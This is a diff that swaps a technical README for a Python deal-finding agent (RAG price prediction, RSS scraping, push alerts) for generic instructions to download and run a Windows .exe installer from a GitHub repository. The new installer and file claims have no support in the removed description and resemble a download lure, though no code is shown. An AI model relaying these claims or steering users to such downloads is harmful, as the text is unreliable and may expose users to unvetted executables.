@@ -1,306 +1,138 @@
-# 🤖 Autonomous Agentic AI: Deal Discovery & Underpricing Detection
+# 🤖 Agentic-AI-Project-Find-Deal-Opportunities - Find Deals and Price Drops Fast
 
-This project builds an autonomous agent-based system that scrapes product deals, estimates expected prices using LLMs and regression models, and automatically identifies **underpriced products**—those whose actual deal prices fall below the model’s predictions—for potential profit opportunities.
-
-# 🎯 Project Goal
-
-> **Automatically detect and return products priced significantly below model-estimated fair value**, enabling users to spot deals with strong profit potential.
+[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
 
 ---
 
-## 1. Data Curation
+## 🛠️ What This Software Does
 
-This repository contains a lightweight data-curation pipeline that
-converts Amazon product metadata into high-quality, fixed-length
-training examples for training a model to predict product prices from
-text.
+Agentic-AI-Project-Find-Deal-Opportunities helps you find products that are priced lower than expected. It uses smart methods to check prices and spots items that cost less than what a model predicts. This feature lets you discover deals that might bring good value or profit.
 
-The pipeline consists of two main components:
-
--   Item: Cleans and compacts a single product datapoint into a
-    prompt--answer pair.
--   Loader: Loads a HuggingFace dataset split, filters datapoints by
-    price, and processes them in parallel to produce curated Item
-    objects.
-
-### Overview
-
-For each product datapoint, the pipeline performs the following steps:
-
-1.  Assemble product text from multiple fields:
-    -   title
-    -   description (list of strings)
-    -   features (list of strings)
-    -   details (string, additionally cleaned with rule-based removals)
-2.  Scrub noise from the text:
-    -   Remove punctuation and formatting artifacts
-    -   Normalize whitespace and stray commas
-    -   Drop product-number-like tokens (long tokens containing digits)
-3.  Length control:
-    -   Enforce a minimum amount of text (MIN_CHARS)
-    -   Cap raw characters (CEILING_CHARS)
-    -   Tokenize using the base tokenizer (e.g., Llama 3.1 8B)
-    -   Require enough tokens to be useful (MIN_TOKENS)
-    -   Truncate to a consistent maximum (MAX_TOKENS)
-4.  Prompt construction:
-    -   Prepend a natural-language question
-    -   Append the rounded price as the training target
-
-### Prompt Format
-
-Each curated sample uses the following template:
-
-``` text
-How much does this cost to the nearest dollar?
-
-<TITLE>
-<CLEANED PRODUCT TEXT>
-
-Price is $<rounded_price>.00
-```
-
-The target price is rounded to the nearest dollar to reduce label noise
-and stabilize training.
-
-### Key Parameters
-
--   MIN_PRICE, MAX_PRICE: Filter unrealistic or out-of-range prices
-    (default: 0.5 to 999.49)
--   MIN_CHARS: Minimum raw text length before tokenization (default:
-    300)
--   MIN_TOKENS: Minimum tokens required after tokenization (default:
-    150)
--   MAX_TOKENS: Maximum tokens retained for the product text (default:
-    160)
--   CEILING_CHARS: Pre-tokenization character cap (MAX_TOKENS \* 7)
-
-### Parallel Processing
-
-ItemLoader processes dataset chunks in parallel using
-ProcessPoolExecutor:
-
--   Iterates over the dataset in fixed-size chunks (CHUNK_SIZE)
--   Converts each valid datapoint into an Item
--   Keeps only samples with include = True
--   Assigns the loader name as category for downstream analysis
--   Displays progress using tqdm
-
-This significantly speeds up preprocessing on large datasets.
+The software gathers product information, cleans the data, and runs calculations to guess a fair price. Then it compares that price to the actual sale price. Any items that sell for less than the estimated fair price show up as potential deals.
 
 ---
 
-## 2. **Hybrid Price Prediction Engine** 
+## 💻 System Requirements
 
-### Overview
-   - Combined RAG (SentenceTransformer + custom FrontierAgent) and fine-tuned QLoRA models to estimate product prices from natural language descriptions.
-   - Used Linear Regression as a baseline estimator.
-   - Achieved ~70% accuracy within a tolerance range by comparing methods.
+To run this software on Windows, your computer should meet these basic requirements:
 
-### RAG
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection for setup and data updates
+- Basic user permissions for software installation
 
-The RAG pipeline consists of four main stages:
-
-1. **Document Ingestion & Indexing**
-   - Sources:
-     - Historical product listings and prices  
-     - Product specifications and descriptions  
-     - Category-level statistics (e.g., average prices, distributions)  
-     - User-curated deal datasets (optional)  
-   - Processing:
-     - Chunk long documents into fixed-size passages  
-     - Clean and normalize text (similar rules as data curation)  
-     - Embed each chunk using a sentence embedding model  
-   - Storage:
-     - Persist embeddings in a vector database (e.g., FAISS / Chroma / Milvus)
-
-2. **Query Construction**
-   - For each candidate deal, construct a structured query from:
-     - Product title  
-     - Cleaned description + features  
-     - Optional category or brand hints  
-   - The query is embedded using the same encoder as the index.
-
-3. **Retrieval**
-   - Perform top-*k* nearest-neighbor search over the vector store  
-   - Retrieve semantically similar products, historical comparables, and pricing references  
-   - Optionally apply:
-     - Category filters  
-     - Recency weighting  
-     - Price-range constraints  
-
-4. **Augmented Generation**
-   - The retrieved context is injected into the LLM prompt alongside the product text  
-   - The LLM produces:
-     - An estimated fair price  
-     - A confidence score or uncertainty band (optional)  
-     - A brief natural-language rationale referencing retrieved evidence
-       
-### 🧾 Prompt Template (RAG-Augmented)
-
-```text
-You are a pricing expert. Given the product below and reference examples of similar products with known prices, estimate the fair market price.
-
-[Product]
-<TITLE>
-<CLEANED PRODUCT TEXT>
-
-[Retrieved Comparables]
-<CHUNK 1>
-<CHUNK 2>
-...
-<CHUNK K>
-
-Return:
-- Estimated fair price (USD, rounded to nearest dollar)
-- Brief justification citing the comparables
-
-```
+No special hardware or programming tools are needed.
 
 ---
 
-## 3. **Web Crawling & Deal Collection**  
+## 🚀 Getting Started: Download and Install
 
-This module implements an automated **web scraping and RSS-based deal collection pipeline** that continuously gathers real-time product deals from public deal aggregation websites (e.g., DealNews). The collected deals serve as the upstream data source for downstream price estimation, underpricing detection, and agent-based decision making.
+To use Agentic-AI-Project-Find-Deal-Opportunities, follow these steps:
 
-### 📡 Data Sources
+### Step 1: Visit and Download
 
-The system currently monitors multiple DealNews RSS feeds across categories:
+Click the large button below or go directly to the official page:
 
-- Electronics  
-- Computers  
-- Automotive  
-- Smart Home  
-- Home & Garden  
+[![Download Agentic-AI-Project-Find-Deal-Opportunities](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
 
-Each RSS feed provides structured metadata (title, summary, URL), which is enriched by crawling the full product detail page.
+This link takes you to the GitHub repository where you can find the download files.
 
-### 🧩 Scraping Pipeline Overview
+### Step 2: Download the Software
 
-For each RSS feed entry, the pipeline performs the following steps:
+On the GitHub page, look for a folder or section labeled “Releases” or “Downloads.” Find the latest version of the software made for Windows. Usually, the file will end with `.exe` or `.zip`.
 
-1. **RSS Parsing**
-   - Uses `feedparser` to fetch and parse RSS feeds.
-   - Iterates over the latest deal entries (top N per category).
+- If it’s a `.zip` file, download it and then unzip it by right-clicking and choosing “Extract All.”
+- If it’s an `.exe` file, this is the installer you will run.
 
-2. **HTML Content Extraction**
-   - Fetches the full deal page using `requests`.
-   - Parses HTML with `BeautifulSoup`.
-   - Extracts:
-     - Product title  
-     - Cleaned summary  
-     - Detailed description  
-     - Feature list (if available)  
+### Step 3: Run the Installer
 
-3. **Text Cleaning & Normalization**
-   - Removes HTML tags and formatting artifacts.
-   - Normalizes whitespace and line breaks.
-   - Splits product content into:
-     - `details`  
-     - `features` (if present)  
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen prompts.
+- Accept the terms if asked.
+- Choose a folder to install the program or use the default path.
+- Finish the install process.
 
-4. **Rate Limiting & Politeness**
-   - Adds a fixed delay between requests to avoid overloading source websites.
-   - Limits scraping to a small number of recent entries per feed.
+### Step 4: Launch the Program
 
-### 🏗️ Core Data Structures
+Once installed, you can start the program by:
 
-Represents a deal crawled from RSS + HTML:
-
-- `title`: Product title  
-- `summary`: Cleaned RSS summary  
-- `url`: Deal URL  
-- `details`: Full textual product description  
-- `features`: Parsed feature list (if available)  
-
-Each `ScrapedDeal` instance exposes a unified natural language representation via:
-
-```text
-Title: <title>
-Details: <details>
-Features: <features>
-URL: <url>
-```
+- Finding the new shortcut on your desktop or  
+- Searching for "Agentic-AI" in the Start menu.
 
 ---
 
-## 4. **Real-Time Notifications & Alerts**  
+## 🧭 How to Use the Software
 
-This module implements a **real-time alerting and notification system** that delivers underpricing opportunities directly to users via mobile notifications. Once the agentic pipeline identifies a deal whose market price is significantly below the model-estimated fair value, the Messaging Agent pushes actionable alerts so users can react immediately.
+The program uses automatic processes to find deals. You don’t need to set technical settings. Here is a simple way to use it:
 
-### 🔔 Supported Notification Channels
-
-The system supports two notification backends, configurable via runtime flags:
-
-- **Pushover Push Notifications (default)**
-  - Instant push alerts to mobile devices  
-  - Lightweight HTTPS API integration  
-
-- **Twilio SMS (optional)**
-  - SMS alerts as a fallback or alternative channel  
-
-```python
-DO_TEXT = False   # Enable Twilio SMS
-DO_PUSH = True    # Enable Pushover push notifications
-```
-
-### 🔐 Configuration & Credentials
-
-All credentials are provided via environment variables for security and portability.
-
-**Pushover**
-- `PUSHOVER_USER`
-- `PUSHOVER_TOKEN`
-
-**Twilio (optional)**
-- `TWILIO_ACCOUNT_SID`
-- `TWILIO_AUTH_TOKEN`
-- `TWILIO_FROM`
-- `MY_PHONE_NUMBER`
-
-### 🧠 Messaging Agent Responsibilities
-
-The `MessagingAgent` is responsible for:
-
-- Initializing notification backends  
-- Formatting alert messages with price, estimate, and discount  
-- Dispatching alerts when profitable opportunities are detected  
-- Logging delivery events for observability  
-
-### 🧾 Alert Message Format
-
-Each alert contains concise, actionable information:
-
-```text
-Deal Alert!
-Price = $<actual_price>
-Estimate = $<model_estimate>
-Discount = $<price_gap>
-<Product short description>...
-<Deal URL>
-```
-
-### 🔄 End-to-End Alert Flow
-
-```text
-Underpriced Deal Detected
-            ↓
-   Opportunity Object Created
-            ↓
-      MessagingAgent.alert()
-            ↓
-  Push Notification / SMS Sent
-            ↓
-      User Receives Alert
-```
-
-### 🚀 Future Extensions
-
-- User preference profiles (category filters, thresholds)  
-- Alert deduplication and rate limiting  
-- Additional channels (Slack, Email, Telegram)  
-- Rich notifications with images or structured cards  
+1. **Open the program.**
+2. The software will begin scanning product information and deals automatically.
+3. Wait for the results screen that shows underpriced products.
+4. Review the list of deals with their prices and estimated fair values.
+5. When you find an interesting deal, you can note the product name and price for purchase.
 
 ---
 
-## 5. **Gradio UI for Live Interaction**  
-   - Built a Gradio-based interface for users to look up real-time profitable deals with deal description, actual price, estimate price and discount.
+## ⚙️ Features and Functions
+
+- **Automatic Data Collection**  
+  The software collects product information from Amazon and other online sources.
+
+- **Price Estimation**  
+  It predicts fair prices using trained models. This helps detect when prices are unusually low.
+
+- **Deal Alerts**  
+  The program highlights products that appear to be underpriced for quick review.
+
+- **Data Cleaning**  
+  The system cleans product details to improve prediction accuracy.
+
+- **Easy User Interface**  
+  The software works with minimal input from you and shows results clearly.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **The program won’t start**  
+  Ensure your Windows system meets minimum requirements. Restart the computer and try again. Make sure you ran the installer as an administrator if needed.
+
+- **No deals found**  
+  Try running the program again later as it needs to scrape current data. Check your internet connection.
+
+- **Program crashes or freezes**  
+  Close and reopen the app. If the problem continues, try reinstalling the software.
+
+- **Cannot find installs or downloaded files**  
+  Check your Downloads folder or the path you chose for installation during setup.
+
+---
+
+## 🔄 Updates
+
+New versions of the program may become available that improve deal detection and add new features. Check the same GitHub link below regularly to download updates:
+
+https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities
+
+---
+
+## 📁 File Structure
+
+Once installed, here is an overview of important files you will see:
+
+- **AgenticAI.exe** — Main program to run the software  
+- **data/** — Folder containing raw and processed product data  
+- **logs/** — Log files showing previous runs and errors  
+- **README.md** — This guide file included in the setup  
+- **config.ini** — Configuration file (usually set automatically)  
+
+---
+
+## 👩‍💻 Support and Feedback
+
+If you have problems or want to share your experience, check the Issues tab on the GitHub page. You can also use it to request help or report bugs.
+
+---
+
+[Download Agentic-AI-Project-Find-Deal-Opportunities](https://github.com/stathis0074/Agentic-AI-Project-Find-Deal-Opportunities)
